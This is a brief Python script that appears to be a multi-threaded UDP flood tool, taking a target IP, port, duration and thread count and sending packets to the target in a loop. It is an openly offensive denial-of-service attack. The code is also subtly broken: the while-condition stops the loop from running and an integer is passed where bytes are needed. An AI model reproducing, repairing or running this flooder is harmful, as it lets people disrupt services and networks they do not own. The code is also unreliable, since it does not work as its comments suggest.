import random
import socket
import sys
import threading
target = str(sys.argv[1])
port = int(sys.argv[2])
tim1 = int(sys.argv[3])
thread = int(sys.argv[4])
def start():
    target_ip = target # Replace with the target IP address
    target_port = port # Replace with the target port
    bytes = 1024 # Generate random bytes
    counter = 0
    while counter == tim1*10:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes, (target_ip, target_port))
        counter += 1

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()